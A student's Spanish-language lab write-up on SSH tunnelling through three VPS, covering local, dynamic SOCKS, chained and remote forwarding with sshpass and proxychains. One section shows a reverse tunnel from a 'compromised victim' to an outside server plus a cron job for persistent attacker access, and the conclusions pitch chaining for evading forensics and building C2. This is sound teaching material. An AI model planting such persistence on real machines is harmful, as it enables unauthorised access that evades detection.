# Ejercicio: Tunelización SSH con VPS
## D1n0 - Alejandro Maman INSO3A U-TAD

---

## Descripción

Ejercicio donde practicamos la creación de túneles SSH usando tres VPS como máquinas intermedias.
Se utilizó `sshpass` para automatizar la autenticación y `proxychains` para redirigir el tráfico a través de los túneles creados.

**Infraestructura:**
- VPS1: `65.23.228.29`
- VPS2: `209.38.132.119`
- VPS3: `137.184.44.251`
- Rango de puertos utilizado: `5000-6000`

---

## Ejercicio 1 — Local Port Forwarding (`-L`)

**Objetivo:** redirigir el puerto 80 de VPS1 a mi puerto local 5000.

```
[Kali :5000] ══════ SSH tunnel ══════> [VPS1 :80]
     │                                      │
 curl localhost:5000              servicio web en VPS1
```

```bash
sshpass -p 'password' ssh -L 5000:localhost:80 root@65.23.228.29 -N
```

Confirmamos el funcionamiento del túnel accediendo al servicio web de VPS1 desde local:

```bash
curl http://localhost:5000
```

---

## Ejercicio 2 — Dynamic SOCKS Proxy (`-D`)

**Objetivo:** crear un proxy SOCKS5 en local que enrute el tráfico a través de VPS1.

```
[Kali :5001] ══════ SSH tunnel ══════> [VPS1] ══════> Internet
     │                                    │
proxychains curl icanhazip.com      sale con IP de VPS1
                                      65.23.228.29
```

```bash
sshpass -p 'password' ssh -D 5001 root@65.23.228.29 -N
```

Configuré `proxychains` para usar el puerto 5001:

```bash
# /etc/proxychains4.conf — última línea:
socks5  127.0.0.1  5001
```

Verifiqué que el tráfico saliera por la IP de VPS1:

```bash
proxychains curl icanhazip.com
# Resultado: 65.23.228.29
```

---

## Ejercicio 3 — Cadena de saltos VPS1 → VPS2 → VPS3

**Objetivo:** encadenar tres VPS para que el tráfico atraviese los tres nodos antes de salir a Internet.

```
Terminal 1:
[Kali :5002] ══ SSH (-L) ══> [VPS1 :22] ══════════════> [VPS2 :22]

Terminal 2:
[Kali :5003] ══ SSH (-L) ══> [localhost:5002] ═════════> [VPS3 :22]

Terminal 3:
[Kali :5004] ══ SSH (-D) ══> [localhost:5003] ═════════> Internet

Flujo completo:
[Kali]
  │ proxychains curl icanhazip.com
  │
  ▼
[VPS1 :5002] ══════════════════════════════════════════╗
  │                                                     ║
  ▼                                                     ║
[VPS2 :5003] ═════════════════════════════════════╗    ║
  │                                                ║    ║
  ▼                                                ║    ║
[VPS3 :5004 SOCKS] ══════════════════════════╗    ║    ║
  │                                           ╚════╩════╝
  └──> Internet (IP: 137.184.44.251)
```

Abrí tres terminales y ejecuté los túneles de forma encadenada:

**Terminal 1** — túnel desde Kali hasta el puerto SSH de VPS2, pasando por VPS1:
```bash
sshpass -p 'password' ssh -L 5002:209.38.132.119:22 root@65.23.228.29 -N
```

**Terminal 2** — túnel desde Kali hasta el puerto SSH de VPS3, pasando por el túnel anterior hacia VPS2:
```bash
sshpass -p 'password' ssh -L 5003:137.184.44.251:22 root@localhost -p 5002 -N
```

**Terminal 3** — SOCKS proxy final que sale por VPS3:
```bash
sshpass -p 'password' ssh -D 5004 root@localhost -p 5003 -N
```

Actualizamos `proxychains` para apuntar al último proxy:

```bash
# /etc/proxychains4.conf — última línea:
socks5  127.0.0.1  5004
```

Verifiqué que el tráfico saliera por la IP de VPS3:

```bash
proxychains curl icanhazip.com
# Resultado: 137.184.44.251
```

---

## Extra — Remote Port Forwarding (`-R`) — Persistencia en red interna

**Objetivo:** mantener acceso a una máquina comprometida dentro de una red interna,
aunque esté detrás de un firewall o NAT sin acceso directo desde exterior.

La clave es que **la máquina comprometida inicia la conexión hacia fuera** (tráfico saliente,
generalmente permitido por el firewall), creando un túnel inverso que el atacante puede usar
para entrar.

```
RED INTERNA                          EXTERIOR

[Máquina víctima]                    [VPS1]          [Kali atacante]
   (detrás de NAT)
        │                                │                  │
        │   ssh -R 5005:localhost:22     │                  │
        └───────── conexión saliente ───>│                  │
                                         │                  │
                   túnel inverso abierto │<── ssh -p 5005 ──┘
                   en VPS1:5005          │
                                         │
        <══════════ SSH session ══════════════════════════════╗
        │                                                     ║
  acceso total a                                      atacante dentro
  la máquina víctima                                  de la red interna


Firewall:  [PERMITE salida :22] ──> OK
           [BLOQUEA entrada]    ──> irrelevante, la víctima ya abrió el túnel
```

Ejecutar en la **máquina comprometida**:
```bash
sshpass -p 'password' ssh -R 5005:localhost:22 root@65.23.228.29 -N
```

Esto abre el puerto `5005` en VPS1 que apunta de vuelta al puerto `22` de la víctima.
El atacante entonces entra desde Kali:

```bash
ssh root@65.23.228.29 -p 5005
```

Para persistencia, añadir un cronjob en la víctima que reconecte si cae el túnel:

```bash
# crontab -e en la máquina víctima:
*/5 * * * * sshpass -p 'password' ssh -R 5005:localhost:22 root@65.23.228.29 -N
```

---

## Ejercicio 4 — Acceso entre compañeros via VPS (`-R` + `-L`)

**Objetivo:** un compañero accede a mi máquina Kali usando VPS1 como intermediario.
Mi máquina está detrás de NAT, por lo que soy yo quien inicia la conexión hacia fuera con `-R`.

**Nota:** antes de empezar hay que asegurarse de tener el servicio SSH activo:
```bash
sudo systemctl start ssh
```

```
[Mi Kali] ══ -R 5005 ══════> [VPS1:5005]
                                   │
                                   ║ ◄══ -L 5010 ══ [Kali compañero]
                                   │
[Mi Kali] ◄══════════ ssh localhost:5010 ══ [Kali compañero]
```

**Yo (Alex) — expongo mi SSH en VPS1:**
```bash
sshpass -p 'x' ssh -R 5005:localhost:22 root@65.23.228.29 -N
```

Verifico que el túnel está activo conectándome al VPS y comprobando el puerto:
```bash
sshpass -p 'x' ssh root@65.23.228.29
ss -tlnp | grep 5005
# Resultado esperado: LISTEN 0 128 127.0.0.1:5005 0.0.0.0:*
```

**Compañero — se trae mi SSH a su local y se conecta:**
```bash
# Paso 1 — túnel local desde VPS1:5005 a su localhost:5010
sshpass -p 'x' ssh -L 5010:localhost:5005 root@65.23.228.29 -N
```
```bash
# Paso 2 — se conecta a mi Kali
ssh <mi_usuario>@localhost -p 5010
# mete MI password de Kali
```

---

## Conclusiones

La tunelización SSH es una técnica fundamental tanto en operaciones ofensivas como defensivas.
Permite encapsular tráfico arbitrario dentro de una conexión SSH cifrada.

**`-L` (Local Port Forwarding)**
Redirige un puerto remoto a uno local. Útil para:
- Acceder a servicios internos de una red sin exposición directa
- Saltarse restricciones de firewall que bloquean acceso directo a ciertos puertos
- Acceder a servicios que solo escuchan en localhost del servidor remoto

**`-D` (Dynamic SOCKS Proxy)**
Crea un proxy SOCKS5 dinámico que enruta tráfico arbitrario. Útil para:
- Navegar a través de un VPS como si fuera una VPN ligera
- Forzar herramientas como `nmap`, `curl` o el navegador a salir por otra IP mediante `proxychains`
- Realizar reconocimiento desde una IP diferente a la del atacante
- Evadir bloqueos geográficos o por IP

**Encadenamiento de túneles**
Combinar múltiples `-L` para construir una cadena de saltos antes del SOCKS final. Útil para:
- Aumentar el anonimato distribuyendo el rastro entre varios países/proveedores
- Simular infraestructura de C2 (Command & Control) con redirectores intermedios
- Dificultar el rastreo forense, ya que cada VPS solo conoce el salto anterior y el siguiente
- Pivoting en redes internas: acceder a máquinas que no tienen salida directa a Internet

**`-R` (Remote Port Forwarding)**
Crea un túnel inverso desde la víctima hacia el atacante. Útil para:
- Mantener persistencia en máquinas detrás de NAT o firewall restrictivo
- Evitar detección ya que el tráfico sale de la víctima (saliente, no entrante)
- Combinado con cronjobs, garantiza reconexión automática si cae el túnel
- Base de cualquier infraestructura de C2 realista

**`proxychains`**
Permite forzar cualquier herramienta del sistema a pasar por el proxy SOCKS configurado,
sin necesidad de que la herramienta tenga soporte nativo de proxy.
